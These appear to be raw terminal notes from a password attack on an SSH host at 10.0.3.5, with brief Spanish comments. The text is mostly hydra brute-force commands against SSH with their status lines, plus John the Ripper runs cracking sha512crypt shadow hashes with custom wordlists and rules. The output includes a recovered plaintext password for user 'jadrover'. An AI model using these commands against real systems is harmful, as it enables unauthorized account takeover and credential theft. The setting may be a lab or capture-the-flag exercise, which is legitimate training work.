scp -r fsi:~/archivos ./scp

hydra -C usuarios_mismatch.txt ssh://10.0.3.5 -t 9 -w 7.9 -v -o resultados_mismatch.txt -I
[STATUS] 167.00 tries/min, 167 tries in 00:01h, 2212 to do in 00:14h, 9 active

hydra -L usuarios.txt -P passwords_test.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
[STATUS] 246.00 tries/min, 246 tries in 00:01h, 30681 to do in 02:05h, 4 active

john --wordlist=dict.txt --rules=OneRuleToRuleThemStill --format=sha512crypt --fork=4 hashes.txt



sacar repetidos y ordenar
sort -u usuarios.txt -o usuarios.txt


hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I


../run/john  --incremental shadow_jadrover.txt



ssh daguirre@10.0.3.5


hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o hydra_test.txt -I
jadrover
root




john --format=sha512crypt --wordlist=fing_ultimate.txt --rules=Jumbo users.txt





john --wordlist=dict.txt --rules=wordlist --format=sha512crypt --fork=4 usuarios.txt



john --wordlist=dict.txt --rules=wordlist --format=sha512crypt --fork=4 usuarios.txt

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster
Node numbers 1-4 of 4 (fork)
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Each node loaded the whole wordlist to memory
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Enabling duplicate candidate password suppressor using 256 MiB per process
Failed to use huge pages (not pre-allocated via sysctl? that's fine)
oneiricocelot    (jadrover)     
1 0g 0:00:00:20 2.61% (ETA: 12:21:07) 0g/s 280.5p/s 561.0c/s 561.0C/s mmantic-minotaur23..FossaFocal27
4 0g 0:00:00:19 2.85% (ETA: 12:19:30) 0g/s 283.3p/s 566.6c/s 566.6C/s penSSH..jlinpeas1
3 1g 0:00:00:20 4.79% (ETA: 12:15:19) 0.04950g/s 500.6p/s 557.6c/s 557.6C/s LobsterLunar2023!50..OrioleOracular50
2 0g 0:00:00:20 2.80% (ETA: 12:20:16) 0g/s 279.1p/s 558.2c/s 558.2C/s Lunar23!26..steghide26
1 0g 0:00:00:39 4.96% (ETA: 12:21:28) 0g/s 278.9p/s 561.1c/s 561.1C/s Mantic-Minotaur23007..Adrovert
4 0g 0:00:00:38 5.20% (ETA: 12:20:34) 0g/s 279.9p/s 559.8c/s 559.8C/s WartyWarthog74..linpeas172
3 1g 0:00:00:39 9.98% (ETA: 12:14:52) 0.02547g/s 531.4p/s 560.8c/s 560.8C/s Manticminotaur#7..Jammyjellyfish0412
2 0g 0:00:00:39 5.41% (ETA: 12:20:24) 0g/s 280.0p/s 559.9c/s 559.9C/s LobsterLunar!64..oriole202464